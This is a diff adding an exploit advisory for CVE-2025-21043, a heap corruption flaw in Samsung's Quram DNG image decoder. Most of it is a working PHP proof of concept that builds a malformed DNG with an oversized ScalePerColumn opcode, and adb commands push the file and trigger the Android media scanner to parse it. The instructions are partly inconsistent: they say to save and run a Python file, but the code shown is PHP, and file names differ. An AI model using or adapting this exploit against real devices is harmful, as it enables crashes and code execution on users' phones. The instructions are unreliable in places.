@@ -1,0 +1,234 @@
+=============================================================================================================================================
+| # Title     : Samsung Quram DNG Heap Corruption via Malformed ScalePerColumn Opcode                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211370/ & CVE-2025-21043
+
+[+] Summary : Samsung devices utilize Quram’s DNG decoder. A malformed ScalePerColumn opcode with oversized areaSpec and extreme pitches leads to arithmetic overflow in
+              the per-column scaling loop. After allocation miscalculation, subsequent writes corrupt heap structures. 
+			  Carefully crafted payloads enable control over free()function pointers, leading to fully controlled execution.
+
+[+] Impact
+
+Heap metadata & function pointer overwrite → Remote Code Execution.
+
+###############################################################################
+PoC highlights:
+- Takes a valid DNG template.
+- Injects ScalePerColumn opcode ID 42 with malicious parameters.
+- Forced overwrite due to uncontrolled scale-array computation.
+- Deliverable via Android media scanner.
+
+Save PoC as:
+    exploit.py
+    template.dng
+
+Run:
+    python3 exploit.py
+    adb push PoC1.jpeg /sdcard/
+    adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE \
+       -d file:///sdcard/PoC1.jpeg
+
+###############################################################################
+Affected:
+- Samsung devices using libimagecodec.quram.so
+- Android versions 13–16
+- Patch levels older than September 2025
+
+Impact:
+- Heap metadata corruption
+- Function pointer overwrite
+- Controlled RCE in Quram image decoding pipeline
+
+###############################################################################
+Technical:
+The ScalePerColumn opcode (ID 42) accepts an areaSpec followed by a
+variable-length scaling array. Due to lack of integer sanitization, an extreme
+left offset combined with huge column pitch results in an incorrect scale_count
+and massive allocation mismatch. Writes overflow heap chunks, overwriting allocator
+metadata and indirect function pointers.
+
+PoC:
+- Injects crafted opcode at arbitrary IFD offset.
+- Builds malicious areaSpec.
+- Forces memory overwrite during scaling loop.
+
+###############################################################################
+How To Save:
+1) Save files:
+       template.dng
+       exploit.py
+
+How To Run:
+    php poc.php
+    adb push PoC1.jpeg /sdcard/
+    adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE \
+        -d file:///sdcard/PoC1.jpeg
+
+Expected Result:
+Quram decoder processes malformed opcode → heap corruption triggered.
+
+[+]  POC : 
+
+<?php
+
+
+function u32($v, $little=true){
+    return pack($little?"V":"N", $v);
+}
+
+function i32($v, $little=true){
+    return pack($little?"V":"N", $v);
+}
+
+function f32($f, $little=true){
+    return $little ? pack("g",$f) : pack("G",$f);
+}
+
+function create_minimal_dng(){
+    $d = "";
+    $d.= "II*\x00";            // TIFF header
+    $d.= u32(8);               // First IFD offset
+
+    $d.= pack("v",1);          // Num entries
+    $d.= pack("v",254);        // Tag
+    $d.= pack("v",4);
+    $d.= u32(1);
+    $d.= u32(0);
+    $d.= u32(0);
+    return $d;
+}
+
+function find_or_create_opcode_offset(&$tmpl){
+    $ifd = unpack("V",substr($tmpl,4,4))[1];
+    while($ifd != 0 && $ifd < strlen($tmpl)){
+        $n = unpack("v",substr($tmpl,$ifd,2))[1];
+        for($i=0;$i<$n;$i++){
+            $o = $ifd+2+($i*12);
+            $tag = unpack("v",substr($tmpl,$o,2))[1];
+            if($tag == 0xC74D){
+                $cnt = unpack("V",substr($tmpl,$o+4,4))[1];
+                $off = unpack("V",substr($tmpl,$o+8,4))[1];
+                return [$off,$cnt];
+            }
+        }
+        $ifd = unpack("V",substr($tmpl,$ifd+2+($n*12),4))[1];
+    }
+
+    $new = strlen($tmpl);
+    $ifd = "";
+    $ifd .= pack("v",1);
+    $ifd .= pack("v",0xC74D);
+    $ifd .= pack("v",4);
+    $cntOffset = strlen($ifd);
+    $ifd .= u32(0);
+    $opcodeDataOffset = $new + strlen($ifd) + 4;
+    $ifd .= u32($opcodeDataOffset);
+    $ifd .= u32(0);
+    $tmpl .= $ifd;
+    return [$opcodeDataOffset,0];
+}
+
+function build_malicious($spec){
+    $out = "";
+    $out .= u32(42);     // opcode ID ScalePerColumn
+
+    $areaSpec = 28;
+    $scaleData = 1024;
+    $tot = $areaSpec + 4 + $scaleData;
+    $out .= u32($tot);
+
+    $out .= i32($spec['l']);
+    $out .= i32($spec['t']);
+    $out .= i32($spec['r']);
+    $out .= i32($spec['b']);
+    $out .= u32($spec['fPlane']);
+    $out .= u32($spec['fPlanes']);
+    $out .= u32($spec['row_pitch']);
+    $out .= u32($spec['col_pitch']);
+
+    $col = ($spec['r'] - $spec['l']) / $spec['col_pitch'];
+    if($col <=0) $col = 1;
+    $out .= u32($col);
+
+    for($i=0;$i<$col;$i++)
+        $out .= f32(2.0);
+
+    while(strlen($out) < $areaSpec+4+$scaleData)
+        $out .= "\x00";
+
+    return $out;
+}
+
+function inject_opcode(&$tmpl,$offset,$data,$count){
+    if($offset >= strlen($tmpl)){
+        $tmpl = str_pad($tmpl,$offset,"\0");
+        $tmpl .= $data;
+    } else {
+        $tmpl = substr_replace($tmpl,$data,$offset);
+    }
+
+    $ifd = unpack("V",substr($tmpl,4,4))[1];
+    while($ifd != 0){
+        $n = unpack("v",substr($tmpl,$ifd,2))[1];
+        for($i=0;$i<$n;$i++){
+            $o = $ifd+2+($i*12);
+            $tag = unpack("v",substr($tmpl,$o,2))[1];
+            if($tag == 0xC74D){
+                $new = u32($count+1);
+                $tmpl = substr_replace($tmpl,$new,$o+4,4);
+                return;
+            }
+        }
+        $ifd = unpack("V",substr($tmpl,$ifd+2+($n*12),4))[1];
+    }
+}
+
+$templ = "template.dng";
+if(!file_exists($templ)){
+    file_put_contents($templ, create_minimal_dng());
+}
+$t = file_get_contents($templ);
+
+$spec = [
+ 'l'=>-2147483644,
+ 'r'=>3,
+ 't'=>0,
+ 'b'=>236,
+ 'col_pitch'=>2147483646,
+ 'row_pitch'=>1,
+ 'fPlane'=>0,
+ 'fPlanes'=>3
+];
+
+list($off,$cnt) = find_or_create_opcode_offset($t);
+$data = build_malicious($spec);
+
+// append if existing opcodes
+$inject = $off;
+if($cnt > 0){
+    $p = $off;
+    for($i=0;$i<$cnt;$i++){
+        $id  = unpack("V",substr($t,$p,4))[1];
+        $sz  = unpack("V",substr($t,$p+4,4))[1];
+        $p  += 8+$sz;
+    }
+    $inject = $p;
+}
+
+inject_opcode($t,$inject,$data,$cnt);
+
+file_put_contents("exploit.dng",$t);
+copy("exploit.dng","Poc1.jpeg");
+
+echo "[+] Generated exploit.dng and Poc1.jpeg\n";
+?>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
